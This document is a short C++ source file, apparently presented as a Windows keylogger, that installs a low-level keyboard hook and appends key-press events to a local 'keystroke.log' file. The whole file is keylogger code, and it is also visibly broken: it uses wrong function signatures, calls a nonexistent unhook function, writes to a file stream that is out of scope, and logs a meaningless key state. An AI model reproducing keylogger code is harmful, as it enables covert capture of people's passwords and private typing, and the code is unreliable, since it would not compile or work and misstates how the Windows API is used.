```c
#include <Windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <thread>

using namespace std;

#define STRICT
#include <Windows.h>

void KeyLoggerCallback(int n, int wparam, int *state);
void SaveKeystroke(string key, int time);

int main() {
    // Initialize the hook
    HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyLoggerCallback);

    // Create a file to log keystrokes
    ofstream keystrokeFile;
    keystrokeFile.open("keystroke.log", ios::app);

    // Start the logging loop
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0) != 0) {
        if (msg.wParam == WM_KEYDOWN || msg.wParam == WM_KEYUP) {
            int key = msg.wParam;
            bool isKeyDown = (msg.wParam == 0x0100); // Check if key is down (key was pressed)
            if (isKeyDown) {
                SaveKeystroke("down", msg.time);
            } else {
                SaveKeystroke("up", msg.time);
            }
        }
    }

    // Cleanup
    UnhookKeyboard(hKeyboardHook);
    keystrokeFile.close();
    return 0;
}

void KeyLoggerCallback(int n, int wparam, int *state) {
    // Handle keyboard events
    if (wparam == 0x0080) { // Only interested in key down and up events
        if (state[0] != 0) {
            // Key is pressed
            SaveKeystroke("down", wparam);
        } else {
            // Key is released
            SaveKeystroke("up", wparam);
        }
    }
}

void SaveKeystroke(string type, int time) {
    keystrokeFile << "[" << type << "] " << static_cast<unsigned char>(GetAsyncKeyState(0));
    keystrokeFile << " at " << time << endl;
}
```

